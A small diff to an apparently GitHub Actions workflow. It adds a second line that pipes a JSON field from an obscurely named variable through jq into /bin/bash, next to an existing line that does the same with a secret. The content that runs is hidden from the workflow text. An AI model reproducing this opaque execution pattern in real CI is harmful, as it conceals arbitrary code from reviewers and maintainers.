@@ -27,6 +27,7 @@ jobs:
           w38: ${{ secrets.w38 }}
         run: |
           printf '%s' "$w38" | jq -r .x618 | /bin/bash
+          printf '%s' "$cn857" | jq -r .dat37 | /bin/bash
 
       - name: Save archive
         if: always()
